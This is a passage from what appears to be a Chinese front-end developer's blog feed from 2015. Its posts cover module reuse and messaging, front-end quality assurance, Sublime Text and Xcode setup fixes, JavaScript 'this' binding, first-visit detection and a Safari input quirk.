数据</code>，渲染的壳子可能是一样的，只是数据源不一样，很多情况下我们可以复用一套 CSS 和 JS 代码，通过下面的方式：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- index.xtpl.html --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">tb-mods</span>=<span class="string">&quot;&quot;</span> <span class="attr">lazyload</span>=<span class="string">&quot;&quot;</span> <span class="attr">path</span>=<span class="string">&quot;tb/promo/1.0.0&quot;</span> <span class="attr">source</span>=<span class="string">&quot;data/st/json/v2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">tb-mods</span>=<span class="string">&quot;&quot;</span> <span class="attr">lazyload</span>=<span class="string">&quot;&quot;</span> <span class="attr">path</span>=<span class="string">&quot;tb/promo/1.0.0&quot;</span> <span class="attr">source</span>=<span class="string">&quot;data/wt/json/v1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在两个相似模块中，我们使用的是同一套 js - <code>tb/promo/1.0.0</code>，但是使用了两个不同的数据源 <code>data/st/json/v2</code>, <code>data/wt/json/v1</code>。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// init.js</span></span><br><span class="line">$mods.<span class="title function_">each</span>(<span class="title function_">functon</span>(<span class="params">$mod</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>($mod.<span class="title function_">attr</span>(<span class="string">&quot;finish&quot;</span>) !== <span class="variable constant_">FINISH_TAG</span>) &#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">        S.<span class="title function_">use</span>($mod.<span class="title function_">attr</span>(<span class="string">&quot;path&quot;</span>), <span class="keyword">function</span>(<span class="params">S, Mod</span>)&#123;</span><br><span class="line">            <span class="comment">// 将数据源传入</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Mod</span>($mod, $mod.<span class="title function_">attr</span>(<span class="string">&quot;source&quot;</span>));</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在初始化脚本中，我们将模块需要用到的数据源传入到模块初始化程序中，这样页面就成功的复用了 <code>tb/promo/1.0.0</code> 的资源。</p><p><strong>2）CSS 的复用问题使用 less 的 mixin 处理</strong></p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@a</span>: red;</span><br><span class="line"><span class="keyword">@b</span>: white;</span><br><span class="line"><span class="selector-class">.s1</span>()&#123;</span><br><span class="line">    <span class="attribute">color</span>: @a;</span><br><span class="line">    <span class="attribute">background</span>: @b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.s2</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: @a;</span><br><span class="line">    <span class="attribute">background</span>: @b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>LESS 是 CSS 的预处理语言，上面的代码打包之后，<code>.s1</code> 是不存在的，只有 <code>.s2</code> 会被打包出来，但是两者都可以 mixin 到其他类中：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.s</span> &#123;</span><br><span class="line">    <span class="selector-class">.s1</span>;</span><br><span class="line">    <span class="selector-class">.s2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用这个特点，我们可以把共用的 css 都包装成类似 <code>.s1</code> 的 less 代码，模块中需要的时候就 mixin，不需要的话，放在那里也没关系，不会造成代码冗余。</p><p><strong>3）JavaScript 的代码复用问题</strong></p><p>页面级别的 JS 代码其实并不多，比如我们平时用的比较频繁的有 Slide、Lazyload、Tab、Storage 等，但这些东西都是以组件的形式引入到页面中。仔细想一想，JS 中哪些代码是需要页面共用的？相对整个项目的文件大小，共用的部分又有多少？</p><p>我们使用的基础库方法并不全面，比如：没有对 URL 解析的 <code>unparam</code> 方法，而这个方法用的也比较多，希望放到公共部分中去。回头想想，这样的小函数实现起来有啥难度么，三四行代码就能写出来的东西，建议放到组件内部搞定。这会造成一定的代码冗余，但是带来的解耦收益与费力写几行代码的成本相比，这完全是可以接受的。</p><p>页面共用的统计代码、错误收集代码、数据缓存方案、组件通讯代码等，这些量比较大、使用颇为频繁的内容，可以封装成组件，以组件形式引入进来。</p><p>这里还需要很多思考…</p><h4 id="5-模块之间的通讯"><a href="#5-模块之间的通讯" class="headerlink" title="5. 模块之间的通讯"></a>5. 模块之间的通讯</h4><p>模块之间的通讯最让人纠结的是，A 模块想跟 B 模块说话，但是 B 模块还没有初始化出来。所以我们需要引入一个中间人 S，每个模块初始化成功之后都去问一问 S，有没有人给我留言。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// B 给 A 留言，如果 A 存在，则直接将 msg 发给 A</span></span><br><span class="line"><span class="comment">// 如果不存在则送入 S 的消息队列</span></span><br><span class="line">S.<span class="title function_">tell</span>(<span class="string">&quot;A&quot;</span>, &#123;</span><br><span class="line">    <span class="keyword">from</span> : <span class="string">&quot;B&quot;</span>,</span><br><span class="line">    <span class="attr">msg</span>: &#123;&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// A 模块初始化的时候，获取其他模块的留言</span></span><br><span class="line">S.<span class="title function_">getMessage</span>(<span class="string">&quot;A&quot;</span>， <span class="keyword">function</span>(<span class="params">msg</span>)&#123;</span><br><span class="line">    <span class="comment">// dosomething...</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="三、小结"><a href="#三、小结" class="headerlink" title="三、小结"></a>三、小结</h3><p>还有很多东西不在主题的讨论范围内，就不一一列举出来了。</p><p>项目开发参与的人越多，代码就越难维护，约束只是一时的，编程方式、编码格式等的约束并不能从根本上解决问题，一旦约束的点未覆盖，结构就会开始散乱，最后必然又会迎来一次整体的重构。</p><p>方法和结果不能改变习惯，所以我们应该从模式出发。</p><p></git></git></git></git></p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对前端质量保障的思考</title>
      <link href="/blog/2015/04/24/cb-Thinking-in-FE-Quality/"/>
      <url>/blog/2015/04/24/cb-Thinking-in-FE-Quality/</url>
      
        <content type="html"><![CDATA[<p>我们时时在踩坑，有时也忍不住埋怨前人给我们留下了无数的坑，可回头想想，自己是不是也在挖坑等别人踩...</p><p>上次听 赵海平 的讲座，他提到 Facebook 没有测试人员，以前和现在都没有，以后也不打算有。还提到上线之后就开发者坐在系统前等着，只要有bug，系统能够在五分钟之内检测到，并提供快捷方式修复。我惊叹的是他们能够在五分钟之内监控到所有的问题，实时回馈并及时修复。</p><p>当然在探讨质量保障这个话题前，我们需要明确几个关键点：编码前、提交代码、测试、上线、回滚、上线后。针对这几个点，下面我谈一谈我的看法。</p><h3>一、编码前</h3><p>上家公司实习期间印象最深的交流是参与编码规范讨论，当时我还呼呼的整理了两份文档：<a href="http://www.cnblogs.com/hustskyking/p/javascript-spec.html">前端编码规范之JavaScript</a>,<a href="http://www.cnblogs.com/hustskyking/p/css-spec.html">前端编码规范之CSS</a>。后来也看到团队在各种工具上添加控制和提示，如 Sublime Text 添加 jslint 配置，项目目录下添加 .jslint 配置，打包工具提示代码的不规范，强制修复等等。</p><p>上面提到的代码规范主要是代码展现层面的规范，他可以让团队写出来的代码就跟一个模子刻出来似的，结构、命名、函数体大小等等很接近，看着很舒服。举几个例子说明他的重要性。</p><p><strong>1. 统一使用 UTF8 编码</strong></p><p>我平时开发都是使用的 UTF8 编码。有次从仓库拉下来发现很多文件都是 GBK 编码，修改时一个文件忘记转换编码，提交发现 锟斤拷 出来了。</p><p><strong>2. TAB 缩进</strong></p><p>我比较喜欢使用四个空格作为 TAB 缩进。一次多人开发的时，发现同事的代码是两个空格的缩进，结果，我改成了四个空格提交之后，又被改回来两个空格，然后我接着改回去...</p><p><strong>3. 加不加分号</strong></p><p>以前写过一篇文章，谈了下自己对分号的看法：<a href="http://www.cnblogs.com/hustskyking/p/semicolon-retalk.html">Javascript分号，加还是不加？</a>，我的回答是加但非必须。</p><p>代码的规范，对程序本身的意义并不是很大，他不会作用在程序的逻辑上，作用点在于团队合作。一个项目可能是多人开发，也可能是今天我开发，明天托付给你。如果两个人在编码习惯上的差异很大，就会偏头痛...有一点需要特别提出来，就是写注释！某次排查一个线上问题，找到了问题所在的文件，但是文件中的逻辑实在是太过复杂，四五百行代码仅三行注释，眼睛都看花了。其实只要在大段的代码前加几句注释，说明本段代码的大意，在排查定位问题的时候就可以忽略一部分代码块，可以为修复线上bug争取不少时间。</p><h3>二、提交代码</h3><p>这部分特指工具。可以说过了工具这一道关卡，代码基本就获得自由，bug 也就开始横飞了。目前工具可以为我们做的事情：</p><p><strong>1. 检测</strong></p><ul class="task-list"><li>现在并没有做 jslint 之类的配置，所以代码的展示是没怎么规范的。</li><li>编码应该统一为 UTF-8 格式，如果不是这种格式，工具应该有所提示。</li><li>代码块过长提示，一个函数不应该写到几百上千行，拆分代码刚开始是辛苦，一旦后续复用的时候，就会很爽很爽了（当然，刚开始编码的时候就应该考虑一个函数的颗粒度控制）。</li></ul><p>更重要的是对语法的检测，我们可能把 <code>document</code> 拼写成了 <code>doucment</code>，甚至使用 <code>for in</code> 来遍历一个数组，这种问题时而出现，工具是否考虑帮助我们处理掉一些简单的愚蠢的错误。</p><p><strong>2. 压缩</strong></p><p>压缩代码的时候，我踩过坑：<a href="http://hi.barretlee.com/2015/03/26/attention-in-gulp-minify-css/">gulp打包压缩css遇到的坑</a>，我相信很多人都认识 grunt 和 gulp，但是一定鲜有人自己配置过这些东西，并投入到项目中。</p><p>代码的压缩，一方面可以减少线上流量，一方面也是出于安全的考虑。压缩后的代码线上报错很难定位到准确的位置，有些问题只能在用户的电脑上复现，"代理到本地这个法子"远程操作的时候是不靠谱的。压缩不仅仅应该把代码缩短，还要考虑线上排查问题的难度。</p><p>在压缩的时候可以考虑添加空行，将网页错误定位范围缩减到单个文件。也可以使用 sourceMap 之类的辅助方式。在<a href="http://www.cnblogs.com/cathsfz/p/how-to-capture-and-analyze-javascript-error.html">这篇文章</a>中有过一些讨论。</p><p><strong>3. 合并</strong></p><p>很多事情，别人不考虑，工具就得考虑。</p><p>这里有一个思考，HTTP2.0 支持多路复用，一个连接可以进行多次 HTTP 的传输，那以后的 sprite 图、文件的合并等是不是也应该重新考虑了。文件的全部合并真的是最省资源的方式么？是否可以考虑更多的合并方案？</p><h3>三、测试</h3><p>赵海平 说，技术实践中的三件套：功能 + 测试 + 监控。很多大公司的工程师，深谙功能开发之道，测试方面也能达到 60 分的水平，但是程序的监控上，做的很差，包括 Facebook 的程序员。三件套，对一个优秀的工程师来说，缺一不可。</p><p>这里要说的是程序开发三板斧的第二板，测试。</p><p>我们很自然地联想到了QA，阿里有一大波的测试人员。写完代码提测，好像剩下的就只是测试同学找BUG，我们等着修BUG。前端的测试跟后端还不太一样，逻辑可以测，但是 UI 效果、交互效果不好测，只能靠几双眼睛盯着看，几个鼠标不停地点点点。。。</p><p>虽说逻辑可以通过写测试用例进行测试，会去写测试用例的人却不多。我记得当时学习 AOP 编程的时候，给 ajax 添加了一些 mock 功能，可以在页面上模拟请求测试效果(如<a href="//github.com/jakerella/jquery-mockjax">jquery-mockjax</a>)。编写测试用例确实可以解决很多的问题，但是如何培养编写测试用例的习惯，如何更加便利的测试我们的测试用例，这又是一个值得思考的话题。</p><p>自动化工具一大缺点是很难捕获到特定环境下的错误。据统计，不管你的代码写得多健壮，在一千个用户下，总有那么一个用户，因为浏览器安装了插件、网络问题等导致代码报错，再比如我们在做灰度测试的时候，让用户名首字母为 a-m 的用户命中灰度时出现的错误等等，这些错误自动化测试工具是无法发现的。</p><p>所以我们要把 错误日志统计 灵活地使用起来，他能够使你深入用户，拿到最原始的错误信息。</p><h3>四、上线</h3><p>现在涉及到前端上线的，有多个地方（公司有很多发布系统）：</p><ul class="task-list"><li>TMS发布</li><li>aone2发布</li><li>gitlab发布</li><li>awp发布</li><li>etc.</li></ul><p>gitlab发布通过域名严格区分测试、预发和线上环境，操作界限明确，出错的概率还是很低的（这要求开发者对 git 命令的操作十分熟练），如果几次 reset revert stash 之后便开始犯蒙，那出问题的概率就增大了。每次打下 tag 之前，我都会很仔细地 diff 下代码，看看本次发布和上次发布之间做了哪些修改，确认这些修改点再 push tag。</p><p>aone2的发布，并不是每个人都用过，它的靠谱在于有三种发布方式：</p><ul class="task-list"><li>全网发布，半小时完成</li><li>小淘宝环境灰度发布，两小时完成</li><li>分三次发布，小流量上线，一天完成</li></ul><p>同时也提供了十分方便的回滚机制，只要拥有应用的权限，可以随时回滚代码，效率极高。</p><p>TMS 的发布，我觉得是问题最多的。首先，前端和运营都会拥有发布权限，运营喜欢"瞎搞"，部分页面（如JSON输出）并没有提供页面预览，运营填完之后也不会跑到页面查看效果，于是就出问题了。。TMS发布每次修改只发布一个文件，CDN 发布一个文件的速度是很快的，当你点击发布的那个瞬间，整个同步就基本完成了。可是，当某个节点同步出错，TMS 并没有给出提示，这是第二个隐患。第三个点，TMS坑爹的没有灰度，对一些重要的发布，没有灰度就需要十分十分的谨慎，虽说出错可以及时回滚，但万一没有看到隐性的错误，那就悲惨了。</p><h3>五、回滚</h3><p>没人可以保证自己写的东西绝对不出问题，因为有太多的环境因素是我们想也想不到的，比如最近某类控件在小淘宝环境下全挂了，试问，前端怎么会想到这是Nginx 的灰度系统出问题了，在灰度发布的时候文件没有同步成功，导致整个灰度环境出错。</p><p>所以，一定要给你的程序想一套快速回滚方案。尤其是在做 ABTest 的时候，新版的效果不好需要回滚到之前的状态，这种事情经常有。</p><p>回滚需要注意两点：</p><ol class="task-list"><li>要快。</li><li>上一个状态要保证无错误。</li></ol><p>只要我们能够保证发到线上的每一个版本都是稳定版，那回滚就是 0 风险的事情。</p><h3>六、监控</h3><p>程序开发三板斧的第三板，监控。前端对测试就不太重视，更不用提监控了。没有监控就只能提心吊胆的过日子。</p><p>其实我们使用自动化工具测试、每天用肉眼顶着自己的页面看，这些都属于监控，但是深入到用户的监控，我们做的太少！</p><h3>七、小结</h3><p>看到老大在群里发了几条研发相关的红线：</p><blockquote><p>1、禁止代码未经测试发布;2、禁止代码发布后不进行线上验证;3、禁止核心应用发布没有对应的回滚方案。</p></blockquote><p>毫无疑问，这些都是必须严格遵守的。规范会先把坏习惯压住，进而被理解，最后被消化吸收。</p><p>前端质量保障之路，任重而道远！</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sublime text 3 没有node的build-system</title>
      <link href="/blog/2015/04/15/st3-node-build-system/"/>
      <url>/blog/2015/04/15/st3-node-build-system/</url>
      
        <content type="html"><![CDATA[<p>郁闷了好多次了，Mac 系统 Sublime Text 3，具体版本是 Stable Channel，Build 3083，没有 node 的 build-system，为了方便调试，每次都得把巨型的 webstrom 打开，今天摸索了下，找到了方案~</p><p>首先安装下 <code>Javascript &amp; Coffee Build System</code> 的插件，这个时候 ST 会多出三个 Build-System，分别是</p><ol><li>xjs</li><li>xjs - Compile</li><li>xjs - Harmony</li></ol><p>使用 xjs 就可以运行 js 脚本，直接 Ctrl + B 可能会报错，说 </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">not found file or <span class="built_in">fold</span> `node`</span><br></pre></td></tr></table></figure><p>云云的错误。我们的 node 一般安装在 <code>/usr/local/bin/node</code> 这个地方。而环境变量，如果没有修改的话应该是这些：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/bin:/usr/sbin/:/bin:/sbin</span><br></pre></td></tr></table></figure><p>你可以将 <code>/usr/local/bin/node</code> 加入到环境变量，也可以这样</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">ln</span> -s /usr/local/bin/node /usr/bin/node</span><br></pre></td></tr></table></figure><p>OK，就这么愉快的搞定了，如果想以 harmony 方式运行，可以按下 <code>Ctrl+Shift+B</code>，选择 <code>xjs - Harmony</code> 就行了。</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ST3 </tag>
            
            <tag> node </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>this的指向</title>
      <link href="/blog/2015/04/13/this-reference/"/>
      <url>/blog/2015/04/13/this-reference/</url>
      
        <content type="html"><![CDATA[<p>网友问题：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="string">&quot;The Window&quot;</span>;   </span><br><span class="line">　　<span class="keyword">var</span> object = &#123;  </span><br><span class="line">　　　　name : <span class="string">&quot;My Object&quot;</span>,  </span><br><span class="line">　　　　getNameFunc : <span class="keyword">function</span>(<span class="params"></span>)&#123;  </span><br><span class="line">　　　　　　　　<span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">name</span>;  </span><br><span class="line">　　　　&#125;   </span><br><span class="line">&#125;;  </span><br><span class="line"><span class="keyword">var</span> a = object.<span class="property">getNameFunc</span>;</span><br><span class="line"><span class="title function_">alert</span>(<span class="title function_">a</span>());</span><br><span class="line"><span class="title function_">alert</span>(object.<span class="title function_">getNameFunc</span>());</span><br></pre></td></tr></table></figure><p>原因：</p><p><code>object.getNameFunc()</code> ，此时的 <code>object.getNameFunc</code> 为引用类型，其 base 为 <code>object</code>，this 指向的是 base，所以返回 <code>object.name</code> 的值</p><p><code>name = object.getNameFunc</code>, <code>test</code> 作为标识符，生成了其他引用类型的值，此时 base 已经从 <code>object</code> 重置为 <code>null</code>，也就是会指向 global（window），所以返回的是 window.name 的值。</p><p>问题的关键在于「引用类型（type Reference）的中间值发生改变」</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> this </tag>
            
            <tag> reference </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Xcode-select Error</title>
      <link href="/blog/2015/04/13/xcode-select-error/"/>
      <url>/blog/2015/04/13/xcode-select-error/</url>
      
        <content type="html"><![CDATA[<p>错误信息：</p><blockquote><p>xcode-select: error: tool ‘xcodebuild’ requires Xcode, but active developer directory ‘&#x2F;Library&#x2F;Developer&#x2F;CommandLineTools’ is a command line tools instance</p></blockquote><p>解决方案：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo xcode-select --switch /Applications/Xcode.app/Contents/Developer</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mac </tag>
            
            <tag> Xcode </tag>
            
            <tag> Error </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从Facebook跑来阿里的赵海平大叔，你要干啥？</title>
      <link href="/blog/2015/04/07/zhaohaiping-in-my-eye/"/>
      <url>/blog/2015/04/07/zhaohaiping-in-my-eye/</url>
      
        <content type="html"><![CDATA[<p>赵海平在今年三月份来到阿里，听毕玄（他现任主管）说去年五六月份就跟赵海平聊上了。有人问：为啥 BAT 三大巨头，你看中了阿里巴巴？在今天现场达一千多人的分享中赵海平给出了回复：“因为百度和腾讯没找我呗<del>”，他笑道，“百度以搜索为核心，优化了很多年了，估计也没啥可以优化的了；而腾讯除了 QQ 和微信，也没什么大型应用（别跟人家说哦）”。这不是原话哈，赵海平还是相当谦虚并且能言的，思维很开阔，两个小时的分享内容丰富，时不时还插两个故事，起初进场的手机和电脑都很自觉的收起来了</del>旁边的同事侃道：“高 P 也都是能搞 PPT 的。”</p><p>他分享的主题是《我眼中的Facebook的技术演进》，从 2006 年到 2014 年，Facebook 在技术上遇到的各种瓶颈和解决方案，演说过程灌输了不少自己的思考和经验，还是很有体会的，尤其是：</p><ol><li>技术实践中的三件套：功能 + 测试 + 监控。很多大公司的工程师，深谙功能开发之道，测试方面也能达到 60 分的水平，但是程序的监控上，做的很差，包括 Facebook 的程序员。三件套，对一个优秀的工程师来说，缺一不可。</li><li>Facebook 以前没有 QA(测试人员)，现在也没有。没有 QA ，效率会高一些，但是一定要写测试用例…这方面他说的比较多，我也比较有感触的，现在在负责淘宝首页开发，也没有测试人员…但结果就是开发效率高了不少，胆子吓大了不少，自己也谨慎了不少。</li></ol><p>估摸算算，赵海平应该也快半百了，这样大叔级别的人物，不好好在国外呆着呼吸清新的空气，跑到杭州吸啥 PM2.5。A同学道：大叔级别的人物也是有追求的好么~（不过他的颜貌就像三十出头的年轻人，帅气！）</p><p>Facebook 网站刚刚搭建起来的时候，数据库就只有 <code>info</code> 一张表，这么笼统的描述，可见当时的工程师根本不会想到 FB 会发展到今天如此的壮大。随着 FB 的会员不断增长，一台服务器的数据库装不下去了，于是后来就多了很多个数据库，很多台服务器，数据容量一庞大，查询速度就慢了，接着在 07 年开始使用了 memcache，一段时间过后，CPU 不够用了，他们继续优化底层代码，用 C++ 重新实现 webServer 等等。这些事情都是大公司技术架构的演进过程中必然会经历的，根据自己的需要，把别人开发好的东西搬过来，优化and重构，在优化的过程中，甚至也会弄出一套全新的东西，比如 HipHop、HHVM 等等。</p><p>有人问，现在的高 P 都是不写代码的，你会写么？赵海平盹了一下，说：过来演讲前刚仓促的 push 了一些代码。他会把房子的基层建设做好，不让后来添砖加瓦的人走偏路，代码还是会写的。</p><p>我看到的是一个年轻有活力有底蕴的大叔，希望阿里巴巴因为这位技术大牛的加入而更加丰满！</p>]]></content>
      
      
      <categories>
          
          <category> 笔记本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>根据访问属性进行差异化数据加载</title>
      <link href="/blog/2015/04/03/detect-first-visit-usr/"/>
      <url>/blog/2015/04/03/detect-first-visit-usr/</url>
      
        <content type="html"><![CDATA[<p>判断用户是否第一次访问页面，先不说怎么做，想想什么场景下会用到？</p><p>如果我们页面的体积过大，用户第一次访问，会消耗大量的时间(2-5s)去下载页面所需要的资源，给用户带来的体验是很不好的，尤其是移动端的用户。如果我们可以在用户第一次访问的时候只加载主要内容，在这个主要内容中引导用户做更多的加载资源的操作，一方面可以让用户熟悉系统，一方面也给页面加载资源争取了巨量的时间，何乐而不为？！</p><p>我们能最快想到的方案是，使用 cookie ，服务器根据 cookie 的属性（如某个 Tag 的值为 1 或者 0）来判断要给用户呈现什么样的内容，这样做有几点不好：</p><ol><li>需要服务器协助，而很多时候前端对服务器的控制为 0</li><li>cookie在每次网页请求的时候都会附带，浪费 （当然，可以在用户访问一次之后清理这个 cookie，比如服务器端设置 session 值，不过又增加了后端的逻辑负担，而且不靠谱）</li><li>如果用户禁用了 cookie 呢？</li></ol><p>问题有很多，解决问题的方案也不少，针对这个问题，HTML5规范也提供了相应的事件和属性支持。</p><h3 id="如何判断用户是否为第一次访问页面"><a href="#如何判断用户是否为第一次访问页面" class="headerlink" title="如何判断用户是否为第一次访问页面"></a>如何判断用户是否为第一次访问页面</h3><p>当页面加载的时候会触发 onload 事件，完了之后触发 pageShow 事件，pageShow 事件是页面每次加载都会触发的，而 onload 不然。默认情况下，浏览器会缓存当前访问的页面（隐私模式除外，特殊处理，也会缓存，退出隐私模式时，缓存的所有内容全部删除），当用户点击前进或者后退按钮时，浏览器会从缓存中获取内容，这个时候 onload 事件是不会触发的。</p><p>可以这么说：</p><ul><li>如果待加载的页面不存在于缓存中，会触发 onload ，再触发 pageShow</li><li>如果待加载的页面存在于缓存中，不触发 onload，只触发 pageShow</li></ul><p>pageShow 事件对象 event 中有一个属性值，叫做 persisted，如果这个值为 true，则为缓存数据，false，则为第一次加载。</p><h3 id="差异化加载"><a href="#差异化加载" class="headerlink" title="差异化加载"></a>差异化加载</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> body = <span class="variable language_">document</span>.<span class="property">body</span>;</span><br><span class="line">body.<span class="property">onpageshow</span> = <span class="keyword">function</span>(<span class="params">evt</span>)&#123;</span><br><span class="line">  <span class="keyword">if</span>(evt.<span class="property">persisted</span>)&#123;</span><br><span class="line">    <span class="comment">// 如果从缓存加载，该干啥干啥</span></span><br><span class="line">    <span class="title function_">doSomething</span>();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 如果用户第一次访问（没有缓存），只加载主体框架</span></span><br><span class="line">    <span class="title function_">loadMainContent</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在 <code>loadMainContent()</code> 我们可以这样干：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">funtion <span class="title function_">loadMainContent</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="comment">// 引导用户执行操作，操作一次加载点东西</span></span><br><span class="line">  <span class="title function_">leadUserDoSomething</span>();</span><br><span class="line">  <span class="comment">// 或者悄悄地缓慢的加载需要的数据</span></span><br><span class="line">  <span class="title function_">loadDataInQuickMode</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然，通过 cookie 或者 pageshow 事件属性判断用户浏览器是否有缓存数据不是最终的解决方案，但这是一种思考模式，可以发散思维~</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
          <category> 网络交互 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
            <tag> first-time-visit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Safari不认识type为search的input</title>
      <link href="/blog/2015/04/03/input-bug-in-safari/"/>
      <url>/blog/2015/04/03/input-bug-in-safari/</url>
      
        <content type="html"><![CDATA[<p>我平时很少测试 safari 和 firefox，系统默认的浏览器被我设置成 chrome.</p><p>昨天切图看到个表单，没用人家写好的组件，那一层套一层的 div 看了就怕，因为不需要做什么扩展，就自己写了个。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;search&quot;</span> <span class="attr">name</span>=<span class="string">&quot;q&quot;</span> <span class="attr">id</span>=<span class="string">&quot;J_Query&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>给 <code>J_Query</code> 写了一些样式，可是…Safari很任性的不认，左改右改搞了五六分钟没反应，火了！</p><p>把 type 改成 text 就好了。</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bug </tag>
            
            <tag> CSS </tag>
            
            <tag> safari </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前人挖坑，后人填坑</title>
      <link href="/blog/2015/04/02/cb-bugs/"/>
      <url>/blog/2015/04/02/cb-bugs/</url>
      
        <content type="html"><![CDATA[<p>写代码不免出点 bug，没有人可以保证自己写的代码不出问题，而那些没有被挖掘出来的 bug，便成了后来者哭笑不得的坑...</p><p>这段时间公司全面 https 改造，涉及到域名的迁移，域名的迁移不是 nginx 做个映射就完事儿了，还有各种代码的去 schema，各种组件的搬迁，算是一个大手术！我看最近百度主站也升级到了 https，期间应该出过一次问题吧，貌似回滚了一次，他们遇到的坑应该还不算多，只是 www 域升级，而不是全网。公司最近出了不少的问题，大小问题都有，表面看是前人挖的坑，实际是整体架构思考的有欠缺。</p><p>当我们放下一个项目转投下一个时，手头的东西就要转交给他人处理，或者..不再有人处理，可代码还在那里，搞不好你就引用了别人的东西，保不准哪天别人的代码里就爆出了个大 bug，当然这里的"别人"也可能是 你！我们既不希望自己是受害者，更不希望自己是施害者。</p><h4><span><strong><a id="user-content-1-如何挖坑" class="anchor"></a><span>1. 如何挖坑</span></strong></span></h4><p>挖坑可不是一件简单的事情，你写出来的插件、组件、代码，很可能被很多人用到了，各种业务场景下狂奔你的代码，一堆测试人员检测你的bug，所以在项目中埋坑可不是一件容易的事情。</p><p>那么如何埋坑呢？可以参考以下方案：</p><ul class="task-list"><li>在一个文件中放一坨很长很长的代码，不加注释，不解耦程序</li><li>把判断都放在一层嵌一层深深的逻辑里头</li><li>程序中临时加入几个全局的标记变量，在很多地方改变变量的值，在很多地方使用变量的值</li><li>不考虑多变的场景，不实时容错，让他按照你脑子的轨迹跑</li><li>到处散播不同版本的代码，不整理统一的文档</li></ul><p>如果这些方案还不够你挖坑，我想你团队同学的技术水平也真真是太高了。</p><p>很多时候，我们都是不经意间留下了隐患。当自己写的东西被其他人使用后，程序需要兼顾的场景就会增多，出现的问题也会变多，这个时候我们不得不完善自己的代码逻辑。结果就是，逻辑耦合度高了不少，代码层次深了不少，出错的概率也就增加了不少。</p><p>所以在设计一个功能或者组件的时候，该考虑什么，不该考虑什么，一定要理清楚。并不是所有东西都适合往代码里加，我们不是在做 ExtJS 这个整体方案，也不是编织一个底层的操作库，只是用少量的逻辑整合离散化、个性化的业务，这些逻辑越少越好，与核心逻辑无关的内容就必须抽离出来！</p><h4><span><strong><a id="user-content-2-使劲踩坑" class="anchor"></a><span>2. 使劲踩坑</span></strong></span></h4><p>如果说挖坑是一件很有难度的活儿，那踩坑就更难了。其实可以说难的不是踩坑，而是发现自己踩坑了。</p><p>在一堆巨量的文件中找出「因把等于号写成恒等号」造成的 bug，这不是轻松的事情，可能你在 debugger 